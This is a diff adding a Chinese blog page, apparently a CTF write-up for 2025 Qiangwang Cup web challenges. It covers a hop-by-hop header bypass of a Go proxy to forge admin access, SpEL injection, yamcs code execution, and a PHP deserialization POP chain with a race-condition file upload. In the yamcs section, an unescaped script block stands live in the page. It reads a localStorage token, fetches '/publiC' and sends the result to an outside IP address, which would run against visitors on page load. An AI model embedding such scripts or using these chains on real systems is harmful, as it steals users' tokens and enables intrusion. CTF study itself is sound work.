@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>25强网杯复现 - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="25强网杯复现 - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/11/04/25%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-11-03T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-11-04T00:00:00+08:00">
+      November 4, 2025
+    </time>
+    
+
+    <h1 class="title">25强网杯复现</h1>
+  </div>
+
+  <div class="content">
+    <h2 id="secretvault"><a href="#secretvault" class="headerlink" title="secretvault"></a>secretvault</h2><p>访问是一个登录页面<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20251104215539298.png" alt="image-20251104215530853"></p>
+<p>注册后会有session，有jwt</p>
+<p>当你注册一个用户成功登录进去后会发现可以添加一些东西，不存在xss</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20251104215843510.png" alt="image-20251104215843438"></p>
+<p>根据给的附件可以知道在原本的flask应用之外还添加了一个Go Authorizer 代理</p>
+<p>本身的python源代码是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view_func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">view_func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapped</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(uid)</span><br><span class="line">        <span class="keyword">if</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Please sign in first.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uid_int = <span class="built_in">int</span>(uid)</span><br><span class="line">        <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        user = User.query.filter_by(<span class="built_in">id</span>=uid_int).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            flash(<span class="string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        g.current_user = user</span><br><span class="line">        <span class="keyword">return</span> view_func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapped</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    user = g.current_user</span><br><span class="line">    entries = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: entry.<span class="built_in">id</span>,</span><br><span class="line">            <span class="string">&#x27;label&#x27;</span>: entry.label,</span><br><span class="line">            <span class="string">&#x27;login&#x27;</span>: entry.login,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: fernet.decrypt(entry.password_encrypted.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;notes&#x27;</span>: entry.notes,</span><br><span class="line">            <span class="string">&#x27;created_at&#x27;</span>: entry.created_at,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> entry <span class="keyword">in</span> user.vault_entries</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, username=user.username, entries=entries)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到装饰器函数会接受请求中的X-User头，如果没有则默认0，而0是代表管理员，可以试着伪造管理员登录</p>
+<p>则我们需要发送给flask应用的请求中不存在X-User头</p>
+<p>go代理源代码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request)</span></span> &#123;</span><br><span class="line">		req.URL.Scheme = <span class="string">&quot;http&quot;</span></span><br><span class="line">		req.URL.Host = <span class="string">&quot;127.0.0.1:5000&quot;</span></span><br><span class="line"></span><br><span class="line">		uid := GetUIDFromRequest(req)</span><br><span class="line">		log.Printf(<span class="string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())</span><br><span class="line">		req.Header.Del(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;X-User&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;X-Forwarded-For&quot;</span>)</span><br><span class="line">		req.Header.Del(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			req.Header.Set(<span class="string">&quot;X-User&quot;</span>, <span class="string">&quot;anonymous&quot;</span>)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			req.Header.Set(<span class="string">&quot;X-User&quot;</span>, uid)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个代理接收从客户端发来的请求后删除了X-User头，并设置成一些特定的值</p>
+<p>hop by hop headers有个漏洞，当客户端发送给代理的请求头中设置了Connection: &lt;请求头名&gt;的话代理发送给后端的请求就不会包含这个请求头，关于hop by hop headers攻击详见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh03ver/p/18112413#:~:text=%E5%85%B6%E5%AE%9E%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E5%B0%B1%E6%98%AF,%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86DoS.">【技术解读】【WebSec】Abusing HTTP hop-by-hop request headers - wh03ver-momo - 博客园</a></p>
+<p>关键在于这一段</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20251104222508536.png" alt="image-20251104222508508"></p>
+<p>1个包就能得到flag</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20251104221848234.png" alt="image-20251104221848101"></p>
+<h2 id="bbjv"><a href="#bbjv" class="headerlink" title="bbjv"></a>bbjv</h2><p>spel表达式注入将user.home这个属性改成&#x2F;tmp就行没什么好说的，ai秒了</p>
+<h2 id="yamcs"><a href="#yamcs" class="headerlink" title="yamcs"></a>yamcs</h2><p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20251105155610617.png" alt="image-20251105155610463"></p>
+<p>一个基础yamcs</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20251105155652588.png" alt="image-20251105155652444"></p>
+<p>这里可以执行Java代码，点上面的trace就能看到flag</p>
+<script>
+fetch('/publiC', {
+  headers: {
+    'Authorization': 'Bearer ' + localStorage.getItem('token')
+  }
+})
+.then(r => r.text())
+.then(flag => {
+  fetch('http://101.200.78.188:2121/?flag=' + encodeURIComponent(flag));
+});
+</script>
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>网页源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);<span class="comment">//小时+分钟，如1331</span></span><br><span class="line">                    <span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">//不知道值是什么，应该是数字</span></span><br><span class="line">                    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);<span class="comment">//$time+十进制转换后的$GLOBALS[&#x27;filename&#x27;]</span></span><br><span class="line">                    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);<span class="comment">//播种$seed</span></span><br><span class="line"></span><br><span class="line">                    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">                    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$uploadDir</span> . <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">                    &#125;<span class="comment">//清空uploads目录下所有文件</span></span><br><span class="line"></span><br><span class="line">                    <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);<span class="comment">//随机生成8位小写字母字符串</span></span><br><span class="line">                    <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.jpg&#x27;</span>;<span class="comment">//新文件名为$time.$randomstr.jpg</span></span><br><span class="line">                    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//上传的文件</span></span><br><span class="line">                    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">system</span>(<span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success upload!&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="variable">$file</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">                        <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/:\/\//&#x27;</span>, <span class="variable">$file</span>)) <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;Illegal content detected in the file.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable language_">$this</span>-&gt;readflag;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;class&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;func&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>] : <span class="string">&#x27;O:4:&quot;test&quot;:N&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure>
+
+<p>捋一下看这代码逻辑</p>
+<p>generateRandomString()返回一个随机的小写字母字符串，时区默认为上海</p>
+<p>定义了一个类test有三个属性$readflag,$f,$key</p>
+<p>这个类有两个函数__construct,__destruct</p>
+<p>__construct()为$readflag赋值了一个匿名内部类，这个匿名内部类有三个方法__wakeup,__construct,readflag</p>
+<p>这个匿名内部类的__construct干了什么呢？注释写的很清楚了</p>
+<p>匿名内部类的readflag()include了上传的文件，但是对文件名和文件内容都有正则匹配，所以初步思路是上传一个恶意php文件。</p>
+<p>但是题目中给的文件名后缀是jpg，可能得考虑文件名截断，因为$seed其实是已知的，可以通过工具爆破出generateRandomString()会返回什么（但好像没啥用？没找到能利用的点）</p>
+<p>test类的__destruct可以选择new一个类或者调用一个无参函数</p>
+<p>而匿名内部类readflag()方法里面又定义了一个全局函数readflag(),但是因为readflag这个全局方法在匿名内部类方法readflag内部，所以必须先执行匿名内部类的readflag()才能有这个全局readflag(),所以应该需要分为三步执行</p>
+<ol>
+<li><p>test#construct</p>
+</li>
+<li><p>匿名内部类#readflag()</p>
+</li>
+<li><p>readflag()</p>
+</li>
+</ol>
+<p>要依次实现这三步可以通过调用三次test#destruct来实现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test1</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"><span class="variable">$test1</span>-&gt;f = <span class="string">&quot;readflag&quot;</span>;</span><br><span class="line"><span class="variable">$test1</span>-&gt;readflag = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"><span class="variable">$test2</span>-&gt;f = [&amp;<span class="variable">$test1</span>-&gt;readflag, <span class="string">&#x27;readflag&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span>-&gt;readflag = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$test3</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"><span class="variable">$test3</span>-&gt;readflag = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$test3</span>-&gt;f = [&amp;<span class="variable">$test1</span>, <span class="string">&#x27;__construct&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>([<span class="variable">$test3</span>, <span class="variable">$test2</span>, <span class="variable">$test1</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;======prepare to destruct======\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>$test3#destruct-&gt;$test1#construct-&gt;$test2#destruct-&gt;$test1#readflag-&gt;$test1#destruct-&gt;readflag()</p>
+<p>现在已经能成功readflag进行文件包含了，但如何成功上传恶意文件呢？</p>
+<p>通过阅读源码可知在1分钟之内文件名是不变的，且上传文件时会删除uploads目录下所有文件，所以1分钟之内所有线程都是对同一个文件路径进行操作，此时就可以利用时间差进行条件竞争，如果说在某个线程进行file_get_content时另一个线程恰好进行到删除文件但又没到上传文件那一步。就能绕过检测，成功include.</p>
+<p>还有另一种做法<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/19156437">强网杯 2025 部分web wp - LamentXU - 博客园</a></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2026/03/06/ThermalPower/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">ThermalPower</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/09/24/Jackson/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Jackson-Chain</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
